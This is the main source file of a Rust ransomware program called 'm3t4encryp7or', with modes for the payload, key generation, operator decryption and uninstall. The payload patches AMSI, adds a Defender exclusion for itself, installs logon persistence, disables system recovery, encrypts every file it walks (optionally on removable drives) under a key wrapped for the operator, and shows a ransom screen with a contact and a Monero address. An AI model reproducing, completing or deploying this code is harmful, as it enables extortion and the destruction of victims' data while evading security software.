#![cfg_attr(all(windows, not(debug_assertions)), windows_subsystem = "windows")]

mod config;
mod crypto;
mod evasion;
mod gui;
mod obf;
mod ransom;
mod walker;
mod win;

use std::fs::{self, OpenOptions};
use std::io::Write;
use std::path::{Path, PathBuf};
use std::time::{SystemTime, UNIX_EPOCH};

use base64::engine::general_purpose::STANDARD as B64;
use base64::Engine;

pub fn log_path() -> PathBuf {
    std::env::temp_dir().join("m3t4encryp7or.log")
}

fn log(message: &str) {
    let stamp = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0);
    if let Ok(mut file) = OpenOptions::new().create(true).append(true).open(log_path()) {
        let _ = writeln!(file, "[{stamp}] {message}");
    }
}

fn main() {
    let args: Vec<String> = std::env::args().collect();
    match args.get(1).map(String::as_str) {
        Some("keygen") => {
            win::attach_console();
            config::keygen();
        }
        Some("decrypt") => {
            win::attach_console();
            if let Err(err) = run_decrypt(&args) {
                eprintln!("decrypt failed: {err}");
            }
        }
        Some("inspect") => {
            win::attach_console();
            if let Err(err) = run_inspect(&args) {
                eprintln!("inspect failed: {err}");
            }
        }
        Some("uninstall") => {
            win::attach_console();
            win::remove_persistence();
            win::clear_kiosk_policy();
            println!("persistence and kiosk policy removed");
        }
        _ => run_payload(),
    }
}

fn run_payload() {
    evasion::sleep_gate();
    if let Err(err) = acquire_lock() {
        log(&format!("lock: {err}"));
        return;
    }
    if let Err(err) = payload() {
        log(&format!("fatal: {err}"));
    }
}

fn payload() -> Result<(), String> {
    tune_rayon();
    let cfg = config::Config::load()?;
    evasion::patch_amsi();
    if let Ok(exe) = std::env::current_exe() {
        evasion::add_defender_exclusion(&exe);
    }
    let data_dir = config::data_dir();
    fs::create_dir_all(&data_dir).map_err(|e| format!("data dir: {e}"))?;
    let state_file = data_dir.join("state.bin");

    let mut master: Option<[u8; 32]> = None;
    let mut wrapped: Option<crypto::WrappedMasterKey> = None;
    let id: String;
    let fresh: bool;

    if state_file.exists() {
        match ransom::load_state(&data_dir) {
            Some((existing_id, existing_wrapped)) => {
                log(&format!("resuming victim {existing_id}"));
                id = existing_id;
                wrapped = Some(existing_wrapped);
                fresh = false;
            }
            None => {
                log("state.bin unreadable; refusing to re-encrypt");
                id = "UNKNOWN".to_string();
                fresh = false;
            }
        }
    } else {
        let generated = crypto::generate_master();
        let generated_wrapped = crypto::wrap_master(&cfg.operator_pubkey, &generated);
        id = ransom::victim_id();
        ransom::write_state(&data_dir, &generated_wrapped, &id)?;
        log(&format!("victim {id} initialized"));
        master = Some(generated);
        wrapped = Some(generated_wrapped);
        fresh = true;
    }

    let key_name = ransom::key_file_name(&id);
    if let Some(wrapped) = &wrapped {
        // Write once per victim. A resume only re-drops the key if every copy
        // has been deleted; otherwise logon persistence would rewrite it each run.
        if fresh || !ransom::has_recovery_key(&id, cfg.include_removable) {
            let artifacts = ransom::write_recovery(wrapped, &id, &cfg);
            log(&format!(
                "recovery key file written to {} locations",
                artifacts.key_files.len()
            ));
        }
    }

    gui::set_info(&id, &key_name, &cfg.contact, &cfg.xmr_address);
    if let Err(err) = win::install_persistence() {
        log(&format!("persistence: {err}"));
    }

    let include_removable = cfg.include_removable;
    let worker = match master {
        Some(mut key) => {
            win::disable_recovery();
            Some(std::thread::spawn(move || {
                let outcome = walker::encrypt_all(&key, include_removable);
                log(&format!(
                    "encrypted {} files, {} bytes, {} failed",
                    outcome.files, outcome.bytes, outcome.failed
                ));
                crypto::wipe(&mut key);
                gui::mark_done();
            }))
        }
        None => {
            gui::mark_done();
            None
        }
    };

    if !gui::run() {
        if let Some(handle) = worker {
            let _ = handle.join();
        }
    }
    Ok(())
}

fn tune_rayon() {
    let threads = std::thread::available_parallelism()
        .map(|n| n.get())
        .unwrap_or(4);
    let _ = rayon::ThreadPoolBuilder::new()
        .num_threads(threads)
        .thread_name(|i| format!("m3t4-{i}"))
        .build_global();
}

#[cfg(windows)]
fn acquire_lock() -> Result<(), String> {
    use windows_sys::Win32::Foundation::{GetLastError, ERROR_ALREADY_EXISTS};
    use windows_sys::Win32::System::Threading::CreateMutexW;

    let name: Vec<u16> = crate::obf!("M3T4Encryp7or_SingleInstance\0")
        .encode_utf16()
        .collect();
    let handle = unsafe { CreateMutexW(std::ptr::null(), 1, name.as_ptr()) };
    if handle.is_null() {
        return Err("CreateMutexW failed".to_string());
    }
    if unsafe { GetLastError() } == ERROR_ALREADY_EXISTS {
        return Err("another instance is already running".to_string());
    }
    Ok(())
}

#[cfg(not(windows))]
fn acquire_lock() -> Result<(), String> {
    let path = std::env::temp_dir().join("m3t4encryp7or.lock");
    if let Ok(meta) = fs::metadata(&path) {
        let stale = meta
            .modified()
            .ok()
            .and_then(|m| m.elapsed().ok())
            .map(|age| age.as_secs() > 600)
            .unwrap_or(true);
        if !stale {
            return Err("another instance is already running".to_string());
        }
        let _ = fs::remove_file(&path);
    }
    let mut file = OpenOptions::new()
        .create_new(true)
        .write(true)
        .open(&path)
        .map_err(|e| format!("lock: {e}"))?;
    let _ = writeln!(file, "{}", std::process::id());
    Ok(())
}

fn run_decrypt(args: &[String]) -> Result<(), String> {
    if args.len() < 4 {
        return Err(
            "usage: m3t4encryp7or decrypt <operator-secret-b64> <recovery-key-file|dir> [root]"
                .to_string(),
        );
    }
    let raw = B64
        .decode(args[2].trim())
        .map_err(|_| "operator secret is not valid base64".to_string())?;
    if raw.len() != 32 {
        return Err("operator secret must decode to 32 bytes".to_string());
    }
    let mut secret = [0u8; 32];
    secret.copy_from_slice(&raw);

    let key_target = PathBuf::from(&args[3]);
    let key_path = if key_target.is_file() {
        key_target
    } else {
        ransom::find_key_file(&key_target)
            .ok_or_else(|| format!("no recovery key file under {}", args[3]))?
    };
    let text =
        fs::read_to_string(&key_path).map_err(|e| format!("read {}: {e}", key_path.display()))?;
    let wrapped = ransom::parse_key_file(&text)?;
    let mut master = crypto::unwrap_master(&secret, &wrapped)?;
    crypto::wipe(&mut secret);

    let root = args
        .get(4)
        .map(PathBuf::from)
        .or_else(|| key_path.parent().map(Path::to_path_buf))
        .unwrap_or_else(|| PathBuf::from("."));

    println!("unwrapped master key from {}", key_path.display());
    println!("decrypting under {}", root.display());
    let outcome = walker::decrypt_all(&master, &root);
    println!("decrypted {} files ({} bytes)", outcome.files, outcome.bytes);

    crypto::wipe(&mut master);
    ransom::clear_state(&config::data_dir());
    win::remove_persistence();
    win::clear_kiosk_policy();
    Ok(())
}

fn run_inspect(args: &[String]) -> Result<(), String> {
    let path = args
        .get(2)
        .map(PathBuf::from)
        .ok_or_else(|| "usage: m3t4encryp7or inspect <recovery-key-file>".to_string())?;
    let text = fs::read_to_string(&path).map_err(|e| format!("read {}: {e}", path.display()))?;
    let wrapped = ransom::parse_key_file(&text)?;
    println!("file:     {}", path.display());
    println!("epk:      {}", crypto::epk_b64(&wrapped));
    println!("nonce:    {}", crypto::nonce_b64(&wrapped));
    println!("wrapped:  {}", crypto::data_b64(&wrapped));
    println!("bytes:    {} (32 epk + 12 nonce + 48 wrap)", 32 + 12 + 48);
    Ok(())
}
